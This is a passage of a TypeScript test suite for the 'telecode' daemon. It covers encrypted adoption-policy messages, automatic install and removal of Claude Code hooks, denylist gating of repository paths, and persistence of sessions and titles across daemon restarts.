      expect(typeof question.payload).toBe('string');
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('opens a sealed adopt.config and replies adopt.state as ciphertext (denylist paths never cleartext)', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-cfg-e2e-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const daemonKp = await generateKeyPair();
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000, configPath: join(dir, 'adopt-config.json') },
      keyPair: {
        publicKey: encodeKey(daemonKp.publicKey),
        privateKey: encodeKey(daemonKp.privateKey),
      },
    });
    await daemon.start();
    try {
      // Act as the browser: derive the device shared key and box-seal the policy to the daemon's pubkey.
      const browserKp = await generateKeyPair();
      const shared = await deriveSharedKey(
        await importIdentityPrivateKey(encodeKey(browserKp.privateKey)),
        await importIdentityPublicKey(encodeKey(daemonKp.publicKey)),
      );
      const sealed = await sealPayload(
        { set: { enabled: false, denylist: ['/Users/me/secret'] } },
        shared,
      );
      relay.send(
        makeEnvelope({
          type: 'adopt.config',
          userId: USER,
          deviceId: DEVICE,
          payload: sealed.payload,
          nonce: sealed.nonce,
          senderPublicKey: encodeKey(browserKp.publicKey),
        }),
      );

      const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
      // Invariant #5: the reply (which names a private repo path) is opaque ciphertext to the relay.
      expect(state.nonce).not.toBe('');
      expect(typeof state.payload).toBe('string');
      // The browser, holding the same shared key, opens it to the policy it set.
      expect(await openPayload(state, shared)).toEqual({
        enabled: false,
        denylist: ['/Users/me/secret'],
        hooksInstalled: false,
        events: [],
      });
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('daemon: adoption policy (web-managed config + denylist gating, Journey 3)', () => {
  let relay: FakeRelay;
  let daemon: Daemon | undefined;
  let dir: string;
  let socketPath: string;
  let configPath: string;

  beforeEach(async () => {
    relay = await startFakeRelay(USER, DEVICE);
    dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-policy-'));
    socketPath = join(dir, 'run', 'hook.sock');
    configPath = join(dir, 'adopt-config.json');
  });

  afterEach(async () => {
    await daemon?.stop();
    await relay.close();
    await rm(dir, { recursive: true, force: true });
  });

  /** Start a daemon (cleartext) wired to the policy config file. */
  async function start(): Promise<void> {
    daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000, configPath },
    });
    await daemon.start();
  }

  /** Start a daemon wired for frictionless setup: a settings path + hook command → auto-install on start. */
  async function startWithHooks(settingsPath: string): Promise<void> {
    daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: {
        socketPath,
        ackTimeoutMs: 2000,
        configPath,
        settingsPath,
        hookCommand: '"telecode" hook',
      },
    });
    await daemon.start();
  }

  function preTool(cwd: string): unknown {
    return {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd,
      tool_name: 'Read',
      tool_input: {},
    };
  }

  it('persists a SET adopt.config and replies the new adopt.state', async () => {
    await start();
    relay.send(
      makeEnvelope({
        type: 'adopt.config',
        userId: USER,
        deviceId: DEVICE,
        payload: { set: { enabled: false, denylist: ['/Users/me/secret'] } },
      }),
    );
    const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
    // No settings path configured here → hooks unmanaged (hooksInstalled:false); auto-install is covered
    // by the dedicated frictionless-setup describe block below.
    expect(state.payload).toEqual({
      enabled: false,
      denylist: ['/Users/me/secret'],
      hooksInstalled: false,
      events: [],
    });
    // Persisted to disk so it survives a daemon restart.
    expect(JSON.parse(await readFile(configPath, 'utf8'))).toEqual({
      enabled: false,
      denylist: ['/Users/me/secret'],
    });
  });

  it('replies the current adopt.state for a GET (no set)', async () => {
    await writeFile(
      configPath,
      JSON.stringify({ enabled: true, denylist: ['/Users/me/secret'] }),
      'utf8',
    );
    await start();
    relay.send(makeEnvelope({ type: 'adopt.config', userId: USER, deviceId: DEVICE, payload: {} }));
    const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
    expect(state.payload).toEqual({
      enabled: true,
      denylist: ['/Users/me/secret'],
      hooksInstalled: false,
      events: [],
    });
  });

  it('auto-installs the Claude Code hooks on start (frictionless — no manual step) and reports it', async () => {
    const settingsPath = join(dir, 'claude-settings.json');
    // Fresh machine: no config file (adopt-all default: enabled) → the daemon should install the hooks itself.
    await startWithHooks(settingsPath);

    // The hooks are now in ~/.claude/settings.json — the user ran nothing.
    const settings = JSON.parse(await readFile(settingsPath, 'utf8')) as {
      hooks: Record<string, { hooks: { command: string }[] }[]>;
    };
    expect(Object.keys(settings.hooks).sort()).toEqual([
      'Notification',
      'PreToolUse',
      'SessionEnd',
      'SessionStart',
      'Stop',
    ]);

    // And adopt.state reports the setup status so the web can render "active" — parsed with the wire schema
    // so the test also proves the daemon emits a schema-conformant payload.
    relay.send(makeEnvelope({ type: 'adopt.config', userId: USER, deviceId: DEVICE, payload: {} }));
    const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
    const payload = adoptStatePayloadSchema.parse(state.payload);
    expect(payload.enabled).toBe(true);
    expect(payload.hooksInstalled).toBe(true);
    expect(payload.events).toContain('Stop');
    expect(payload.events).toHaveLength(5);
  });

  it('is idempotent across a restart — re-installing on start never duplicates the hooks', async () => {
    const settingsPath = join(dir, 'claude-settings.json');
    await startWithHooks(settingsPath);
    await daemon?.stop();
    daemon = undefined;
    // A second daemon (same settings + config) starts and re-installs — still exactly one telecode hook/event.
    await startWithHooks(settingsPath);
    const settings = JSON.parse(await readFile(settingsPath, 'utf8')) as {
      hooks: Record<string, { hooks: { command: string }[] }[]>;
    };
    assertNoDuplicateTelecodeHooks(settings);
  });

  it('a disabled policy persists across a restart — the daemon never silently re-installs', async () => {
    const settingsPath = join(dir, 'claude-settings.json');
    await startWithHooks(settingsPath); // installed by default
    // Disable + persist to the config file.
    relay.send(
      makeEnvelope({
        type: 'adopt.config',
        userId: USER,
        deviceId: DEVICE,
        payload: { set: { enabled: false, denylist: [] } },
      }),
    );
    await relay.waitForFrame(
      (e) => e.type === 'adopt.state' && !(e.payload as { hooksInstalled: boolean }).hooksInstalled,
    );
    await daemon?.stop();
    daemon = undefined;

    // Restart: the persisted enabled:false is respected — hooks stay uninstalled (the user's choice wins).
    await startWithHooks(settingsPath);
    relay.send(makeEnvelope({ type: 'adopt.config', userId: USER, deviceId: DEVICE, payload: {} }));
    const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
    expect(state.payload).toMatchObject({ enabled: false, hooksInstalled: false });
  });

  it('the enabled toggle drives install/uninstall: disabling removes the hooks, enabling restores them', async () => {
    const settingsPath = join(dir, 'claude-settings.json');
    await startWithHooks(settingsPath); // starts installed (adopt-all default)

    // Disable adoption from the web → telecode backs out of ~/.claude entirely.
    relay.send(
      makeEnvelope({
        type: 'adopt.config',
        userId: USER,
        deviceId: DEVICE,
        payload: { set: { enabled: false, denylist: [] } },
      }),
    );
    const off = await relay.waitForFrame(
      (e) => e.type === 'adopt.state' && !(e.payload as { hooksInstalled: boolean }).hooksInstalled,
    );
    expect(adoptStatePayloadSchema.parse(off.payload).hooksInstalled).toBe(false);
    expect('hooks' in JSON.parse(await readFile(settingsPath, 'utf8'))).toBe(false);

    // Re-enable → the hooks are reinstalled, no manual step.
    relay.send(
      makeEnvelope({
        type: 'adopt.config',
        userId: USER,
        deviceId: DEVICE,
        payload: { set: { enabled: true, denylist: [] } },
      }),
    );
    const on = await relay.waitForFrame(
      (e) => e.type === 'adopt.state' && (e.payload as { hooksInstalled: boolean }).hooksInstalled,
    );
    expect(adoptStatePayloadSchema.parse(on.payload).events).toHaveLength(5);
  });

  it('starts and serves even when the hooks cannot be installed (fail-soft), reporting not-installed', async () => {
    // A settings path pointing at a directory makes the write fail — the daemon must still start + connect.
    const blocked = join(dir, 'blocked-settings');
    await mkdir(blocked, { recursive: true });
    await expect(startWithHooks(blocked)).resolves.toBeUndefined();

    // It answers adopt.config, honestly reporting the hooks aren't installed rather than a false "active".
    relay.send(makeEnvelope({ type: 'adopt.config', userId: USER, deviceId: DEVICE, payload: {} }));
    const state = await relay.waitForFrame((e) => e.type === 'adopt.state');
    expect(adoptStatePayloadSchema.parse(state.payload)).toMatchObject({
      enabled: true,
      hooksInstalled: false,
    });
  });

  it('does NOT adopt a session whose cwd is on the denylist (telecode stays out)', async () => {
    await writeFile(
      configPath,
      JSON.stringify({ enabled: true, denylist: ['/Users/me/secret'] }),
      'utf8',
    );
    await start();

    // A session in the denied repo → no announce, hook returns {} (Claude Code's own local flow applies).
    const denied = hookRpc(socketPath, preTool('/Users/me/secret/app'));
    expect(await denied).toEqual({});

    // A session in an allowed repo IS adopted — and its announce is the FIRST session.adopted frame, proving
    // the denied one produced none.
    const allowed = hookRpc(socketPath, preTool('/Users/me/work'));
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    expect((announce.payload as { clientRef: string }).clientRef).toBe(CLAUDE_SESSION);
    ackAdopted(relay, announce);
    await allowed;
  });

  it('does NOT adopt anything while adoption is disabled', async () => {
    await writeFile(configPath, JSON.stringify({ enabled: false, denylist: [] }), 'utf8');
    await start();
    const event = hookRpc(socketPath, preTool('/Users/me/work'));
    expect(await event).toEqual({});

    // Re-enable via the web → a subsequent session adopts (proves the runtime gate honours the live policy).
    relay.send(
      makeEnvelope({
        type: 'adopt.config',
        userId: USER,
        deviceId: DEVICE,
        payload: { set: { enabled: true, denylist: [] } },
      }),
    );
    await relay.waitForFrame((e) => e.type === 'adopt.state');

    const after = hookRpc(socketPath, preTool('/Users/me/work'));
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    expect((announce.payload as { clientRef: string }).clientRef).toBe(CLAUDE_SESSION);
    ackAdopted(relay, announce);
    await after;
  });
});

describe('daemon: adopted session survives a restart without a duplicate card (session-identity T4)', () => {
  let dir: string;
  // Track every daemon/relay so a thrown assertion never leaks a reconnect-looping daemon or an open WS
  // server into a later test (the single afterEach drains them regardless of outcome).
  const started: { relay: FakeRelay; daemon: Daemon }[] = [];

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-restart-'));
  });
  afterEach(async () => {
    await Promise.all(started.splice(0).map((s) => s.daemon.stop()));
    await Promise.all(started.map((s) => s.relay.close()));
    await rm(dir, { recursive: true, force: true });
  });

  async function startAdoptDaemon(): Promise<{ relay: FakeRelay; daemon: Daemon; socket: string }> {
    const relay = await startFakeRelay(USER, DEVICE);
    const socket = join(dir, 'run', 'hook.sock');
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      sessionStore: createSessionStore({ dir: join(dir, 'sessions') }),
      adopt: { socketPath: socket, ackTimeoutMs: 2000 },
      logger: pino({ level: 'silent' }),
    });
    await daemon.start();
    started.push({ relay, daemon });
    return { relay, daemon, socket };
  }

  async function awaitPersistedClaudeId(): Promise<void> {
    await vi.waitFor(
      async () => {
        const persisted = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
          TELECODE_SESSION,
        );
        expect(persisted?.claudeSessionId).toBe(CLAUDE_SESSION);
      },
      { timeout: 5000, interval: 50 },
    );
  }

  const readTool = (session: string) => ({
    hook_event_name: 'PreToolUse',
    session_id: session,
    cwd: '/repo',
    tool_name: 'Read',
    tool_input: { file_path: 'README.md' },
    tool_use_id: 'toolu_restart',
  });

  it('recognizes the adopted Claude session after a restart instead of re-announcing it', async () => {
    // Daemon A: adopt the session and let the mapping persist.
    const a = await startAdoptDaemon();
    const firstDecision = hookRpc(a.socket, readTool(CLAUDE_SESSION));
    ackAdopted(a.relay, await a.relay.waitForFrame((e) => e.type === 'session.adopted'));
    await firstDecision;
    await awaitPersistedClaudeId();
    await a.daemon.stop();
    await a.relay.close();

    // Daemon B: a fresh process on the same store. Its FIRST session.reconcile (sent right after
    // hello.ack) must already list the restored id — that's what keeps the relay from retiring the
    // restored non-terminal adopted row as stale.
    const b = await startAdoptDaemon();
    const reconcile = await b.relay.waitForFrame((e) => e.type === 'session.reconcile');
    expect((reconcile.payload as { heldSessionIds: string[] }).heldSessionIds).toContain(
      TELECODE_SESSION,
    );

    // And a hook event for the SAME Claude session is handled WITHOUT a second `session.adopted`
    // announce — the restored mapping is recognized, so the read-tool decision resolves `allow`
    // immediately (a re-announce would await an ack that never comes, then fail-closed to `ask`).
    const decision = await hookRpc(b.socket, readTool(CLAUDE_SESSION));
    expect(decision).toMatchObject({ hookSpecificOutput: { permissionDecision: 'allow' } });
  });

  it('re-derives a restored machinery title from the first real prompt at startup (title backfill)', async () => {
    // A record persisted by an older daemon whose title is injected machinery (the pre-classifier
    // refine took the transcript's first 'user' entry verbatim). The session is OVER — no hook will
    // ever fire again — so restore itself must repair the title from the transcript it already holds.
    const store = createSessionStore({ dir: join(dir, 'sessions') });
    store.save(TELECODE_SESSION, {
      status: 'done',
      permissionMode: 'default',
      transcript: [
        { kind: 'user', text: '<local-command-caveat>Caveat: the messages below were generated…' },
        { kind: 'user', text: '<local-command-stdout>Set model to opus</local-command-stdout>' },
        {
          kind: 'user',
          text: 'polish the landing page hero and ship it to production today please',
        },
        { kind: 'message', text: 'done' },
      ],
      meta: {
        title: '<local-command-caveat>Caveat: the messages below were generated…',
        titleSource: 'derived',
        cwd: '/repo',
      },
      origin: 'external',
      claudeSessionId: CLAUDE_SESSION,
    });
    // Barrier on the PARSED record via the store's own read path — save() writes in place, so a raw
    // readFile could pass on a torn/empty file and the one-shot restore would silently drop the id.
    await vi.waitFor(
      async () => {
        const seeded = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
          TELECODE_SESSION,
        );
        expect(seeded?.meta?.title).toBe(
          '<local-command-caveat>Caveat: the messages below were generated…',
        );
      },
      { timeout: 5000, interval: 50 },
    );

    // No subscribe: the corrected title must arrive EAGERLY after registration — the board never
    // subscribes to an ended session, so a lazy (subscribe-only) push would leave its row stale.
    const b = await startAdoptDaemon();
    const meta = sessionMetaPayloadSchema.parse(
      (
        await b.relay.waitForFrame(
          (e) => e.type === 'session.meta' && e.session_id === TELECODE_SESSION,
        )
      ).payload,
    );
    expect(meta.title).toBe('polish the landing page hero and ship it to production…');
    expect(meta.titleSource).toBe('derived');
    expect(meta.cwd).toBe('/repo'); // the rest of the restored identity is preserved

    // And the correction is persisted — the next restart re-derives nothing (no re-emit loop).
    await vi.waitFor(
      async () => {
        const persisted = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
          TELECODE_SESSION,
        );
        expect(persisted?.meta?.title).toBe(
          'polish the landing page hero and ship it to production…',
        );
      },
      { timeout: 5000, interval: 50 },
    );
  });

  it('never backfills over a user-renamed title on restore (rename survives restarts)', async () => {
    // A rename seals titleSource 'user' (T6) — the restore backfill must leave it alone even when the
    // transcript's first real prompt would derive something else, and emit no spurious meta frame.
    const store = createSessionStore({ dir: join(dir, 'sessions') });
    store.save(TELECODE_SESSION, {
      status: 'done',
      permissionMode: 'default',
      transcript: [
        {
          kind: 'user',
          text: 'polish the landing page hero and ship it to production today please',
        },
      ],
      meta: { title: 'My Custom Name', titleSource: 'user', cwd: '/repo' },
      origin: 'external',
      claudeSessionId: CLAUDE_SESSION,
    });
    await vi.waitFor(
      async () => {
        const seeded = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
          TELECODE_SESSION,
        );
        expect(seeded?.meta?.title).toBe('My Custom Name');
      },
      { timeout: 5000, interval: 50 },
    );

    const b = await startAdoptDaemon();
    // Echo round-trip barrier: anything the hello.ack flush enqueued drains before the daemon even
    // processes the echo message, so by the reply, a backfill frame would already have arrived. The
    // peek must observe nothing (no spurious re-derive).
    let observed = false;
    b.relay
      .waitForFrame((e) => e.type === 'session.meta' && e.session_id === TELECODE_SESSION)
      .then(
        () => {
          observed = true;
        },
        // Expected: nothing arrives, so the peek eventually times out — never an unhandled rejection.
        () => undefined,
      );
    b.relay.send(
      makeEnvelope({ type: 'echo', userId: USER, deviceId: DEVICE, payload: { text: 'barrier' } }),
    );
    await b.relay.waitForFrame((e) => e.type === 'echo.reply');
    expect(observed).toBe(false);

    // And the on-disk record still carries the user's name.
    const persisted = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
      TELECODE_SESSION,
    );
    expect(persisted?.meta?.title).toBe('My Custom Name');
    expect(persisted?.meta?.titleSource).toBe('user');
  });

  it('restores an adopted transcript grown by a Stop after adoption (not the adoption snapshot)', async () => {
    const transcriptPath = join(dir, 'transcript.jsonl');
    await writeFile(
      transcriptPath,
      `${JSON.stringify({
        type: 'assistant',
        message: { role: 'assistant', content: [{ type: 'text', text: 'work done after Stop' }] },
      })}\n`,
    );

    // Daemon A: adopt, then a Stop grows the transcript (the Stop-hook persist keeps disk fresh).
    const a = await startAdoptDaemon();
    const firstDecision = hookRpc(a.socket, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(a.relay, await a.relay.waitForFrame((e) => e.type === 'session.adopted'));
    await firstDecision;
    await hookRpc(a.socket, {
      hook_event_name: 'Stop',
      session_id: CLAUDE_SESSION,
      transcript_path: transcriptPath,
    });
    await vi.waitFor(
      async () => {
        const persisted = (await createSessionStore({ dir: join(dir, 'sessions') }).loadAll()).get(
          TELECODE_SESSION,
        );
        expect(
          persisted?.transcript.some(
            (e) => e.kind === 'message' && e.text === 'work done after Stop',
          ),
        ).toBe(true);
      },
      { timeout: 5000, interval: 50 },
    );
    await a.daemon.stop();
    await a.relay.close();

    // Daemon B: a subscribe backfills the POST-Stop transcript, not a frozen adoption-time snapshot.
    const b = await startAdoptDaemon();
    b.relay.send(
      makeEnvelope({
        type: 'session.subscribe',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: {},
      }),
    );
    const history = await b.relay.waitForFrame(
      (e) => e.type === 'session.history' && e.session_id === TELECODE_SESSION,
    );
    const payload = sessionHistoryPayloadSchema.parse(history.payload);
    expect(
      payload.entries.some((e) => e.kind === 'message' && e.text === 'work done after Stop'),
    ).toBe(true);
  });
});
